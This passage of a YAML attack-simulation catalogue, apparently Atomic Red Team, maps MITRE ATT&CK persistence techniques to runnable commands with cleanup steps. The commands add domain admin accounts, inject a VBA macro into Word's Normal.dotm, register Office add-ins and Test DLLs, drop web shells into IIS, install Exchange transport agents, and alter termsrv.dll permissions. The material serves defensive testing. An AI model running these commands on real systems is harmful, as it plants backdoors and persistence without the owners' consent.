        net user "T1136.002_Admin" "T1136_pass123!" /add /domain
        net group "Domain Admins" "T1136.002_Admin" /add /domain
      cleanup: net user "T1136.002_Admin" >nul 2>&1 /del /domain
      timeout: 120
      is_safe: true
    - name: Create a new account similar to ANONYMOUS LOGON
      type: cmd
      platform: windows
      command: net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
      cleanup: net user "ANONYMOUS  LOGON" >nul 2>&1 /del /domain
      timeout: 120
      is_safe: true
    - name: Create a new Domain Account using PowerShell
      type: powershell
      platform: windows
      command: |-
        $SamAccountName = 'T1136.002_Admin'
        $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
        $User.SamAccountName = $SamAccountName
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        $User.DisplayName = $SamAccountName
        $User.Save()
        $User
      cleanup: cmd /c "net user T1136.002_Admin /del >nul 2>&1"
      timeout: 120
      is_safe: true
    - name: Active Directory Create Admin Account
      type: sh
      platform: linux
      command: |-
        echo "dn: CN=Admin User,CN=Users,DC=example,DC=test\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@example.test\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test" > tempadmin.ldif
        echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
        ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
      cleanup: |-
        echo removing Atomic User (temporary user)
        echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
        ldapmodify -H ldap://adVM:389 -x -D admin@example.test -w s3CurePssw0rD! -f deleteuser.ldif
        rm deleteuser.ldif
        rm tempadmin.ldif
      timeout: 60
      is_safe: true
    - name: Active Directory Create User Account (Non-elevated)
      type: sh
      platform: linux
      command: |-
        echo "dn: cn=Atomic User, cn=Users,dc=example,dc=test\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif
        echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
        ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
      cleanup: |-
        echo removing Atomic User (temporary user)
        echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
        ldapmodify -H ldap://adVM:389 -x -D user@example.test -w s3CurePssw0rD! -f deleteuser.ldif
        rm deleteuser.ldif
        rm tempadmin.ldif
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1136/002
  is_safe: true
- id: T1137
  name: Office Application Startup
  description: |-
    Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

    A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Office Application Startup - Outlook as a C2
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v Level /t REG_DWORD /d 1 /f
        mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
        echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v Level /f >nul 2>&1
        del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1137
  is_safe: true
- id: T1137.001
  name: Office Template Macros
  description: "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted dep..."
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell
      type: powershell
      platform: windows
      command: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null"
      cleanup: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1137/001
  is_safe: false
- id: T1137.002
  name: Office Test
  description: |-
    Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

    There exist user and global Registry keys for the Office Test feature, such as:

    * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
    * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

    Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Office Application Startup Test Persistence (HKCU)
      type: powershell
      platform: windows
      command: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
      cleanup: |-
        Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
        Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1137/002
  is_safe: true
- id: T1137.004
  name: Outlook Home Page
  description: |-
    Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

    Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Install Outlook Home Page Persistence
      type: cmd
      platform: windows
      command: reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://PathToAtomicsFolder\T1137.004\src\T1137.004.html /f
      cleanup: reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f >nul 2>&1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1137/004
  is_safe: true
- id: T1137.006
  name: Add-ins
  description: |-
    Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

    Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Code Executed Via Excel Add-in File (XLL)
      type: powershell
      platform: windows
      command: |-
        $excelApp = New-Object -COMObject "Excel.Application"
        if(-not $excelApp.path.contains("Program Files (x86)")){
            Write-Host "64-bit Office"
            $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll")
        }
        else{
          Write-Host "32-bit Office"
          $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")
        }
      cleanup: Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Persistent Code Execution Via Excel Add-in File (XLL)
      type: powershell
      platform: windows
      command: |-
        $excelApp = New-Object -COMObject "Excel.Application"
        if(-not $excelApp.path.contains("Program Files (x86)")){
            Write-Host "64-bit Office"
            Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        else{
          Write-Host "32-bit Office"
          Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        $ver = $excelApp.version
        $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
        Remove-Item $ExcelRegPath -ErrorAction Ignore
        New-Item -type Directory $ExcelRegPath | Out-Null
        New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
        $excelApp.Quit()
        Start-Process "Excel"
      cleanup: |-
        $ver = (New-Object -COMObject "Excel.Application").version
        Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
        Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Persistent Code Execution Via Word Add-in File (WLL)
      type: powershell
      platform: windows
      command: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
      cleanup: |-
        Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Persistent Code Execution Via Excel VBA Add-in File (XLAM)
      type: powershell
      platform: windows
      command: "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\""
      cleanup: |-
        Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
      type: powershell
      platform: windows
      command: |-
        Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"
        $ver = (New-Object -COMObject "PowerPoint.Application").version
        $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
        New-Item -type Directory $ExcelRegPath -Force | Out-Null
        New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null
        New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null
        Stop-Process -Name "PowerPnt" -ErrorAction Ignore
        Start-Process "PowerPnt"
      cleanup: |-
        $ver = (New-Object -COMObject "PowerPoint.Application").version
        Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore
        Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1137/006
  is_safe: true
- id: T1176
  name: Software Extensions
  description: "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application. \n\n\nMalicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. \n\nThe modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows."
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Google Chrome Load Unpacked Extension With Command Line
      type: powershell
      platform: windows
      command: |-
        # Chromium
        $chromium =  "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip"

        # uBlock Origin Lite to test side-loading
        $extension = "https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip"

        Set-Location "$env:TEMP"

        Set-Variable ProgressPreference SilentlyContinue
        Invoke-WebRequest -URI $chromium -OutFile "$env:TEMP\chrome.zip"
        Invoke-WebRequest -URI $extension -OutFile "$env:TEMP\extension.zip"


        Expand-Archive chrome.zip -DestinationPath "$env:TEMP" -Force
        Expand-Archive extension.zip -Force

        Start-Process .\chrome-win\chrome.exe --load-extension="$env:TEMP\extension\" -PassThru
      cleanup: |-
        Set-Location "$env:TEMP"
        Stop-Process -Name chrome -Force
        Remove-Item .\chrome.zip, .\chrome-win, .\extension, .\extension.zip -Recurse -Force
        Set-Variable ProgressPreference Continue
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1176
  is_safe: false
- id: T1505.002
  name: Transport Agent
  description: "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary."
  tactic: persistence
  platforms:
    - linux
    - windows
  executors:
    - name: Install MS Exchange Transport Agent Persistence
      type: powershell
      platform: windows
      command: |-
        Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
        Enable-TransportAgent Security Interop Agent
        Get-TransportAgent | Format-List Name,Enabled
      cleanup: |-
        if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
          Disable-TransportAgent Security Interop Agent
          Uninstall-TransportAgent Security Interop Agent
          Get-TransportAgent
        }
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1505/002
  is_safe: false
- id: T1505.003
  name: Web Shell
  description: |-
    Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

    In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Web Shell Written to Disk
      type: cmd
      platform: windows
      command: xcopy /I /Y "PathToAtomicsFolder\T1505.003\src" C:\inetpub\wwwroot
      cleanup: |-
        del C:\inetpub\wwwroot\b.jsp /q >nul 2>&1
        del C:\inetpub\wwwroot\tests.jsp /q >nul 2>&1
        del C:\inetpub\wwwroot\cmd.aspx /q >nul 2>&1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1505/003
  is_safe: true
- id: T1505.004
  name: IIS Components
  description: |-
    Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)

    Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)

    Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware ...
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Install IIS Module using AppCmd.exe
      type: cmd
      platform: windows
      command: '%windir%\system32\inetsrv\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\system32\inetsrv\defdoc.dll'
      cleanup: '%windir%\system32\inetsrv\appcmd.exe uninstall module DefaultDocumentModule_Atomic'
      timeout: 120
      is_safe: true
    - name: Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
      type: powershell
      platform: windows
      command: New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\system32\inetsrv\defdoc.dll
      cleanup: Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1505/004
  is_safe: true
- id: T1505.005
  name: Terminal Services DLL
  description: |-
    Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)

    [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a "generic" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.

    Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Simulate Patching termsrv.dll
      type: powershell
      platform: windows
      command: |-
        $termsrvDll = "C:\Windows\System32\termsrv.dll"

        $ACL = Get-Acl $termsrvDll
        $permission = "Administrators","FullControl","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $ACL.SetAccessRule($accessRule)
        Set-Acl -Path $termsrvDll -AclObject $ACL

        Copy-Item -Path "C:\Windows\System32\termsrv.dll" -Destination "C:\Windows\System32\termsrv_backup.dll" -ErrorAction Ignore
        Add-Content -Path "C:\Windows\System32\termsrv.dll" -Value "`n" -NoNewline -ErrorAction Ignore
        Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
      cleanup: Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Modify Terminal Services DLL Path
      type: powershell
      platform: windows
      command: |-
        $termsrvDll = "C:\Windows\System32\termsrv.dll"

        $ACL = Get-Acl $termsrvDll
        $permission = "Administrators","FullControl","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $ACL.SetAccessRule($accessRule)
        Set-Acl -Path $termsrvDll -AclObject $ACL

        Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"

        $newServiceDll = "$HOME\AtomicTest.dll"

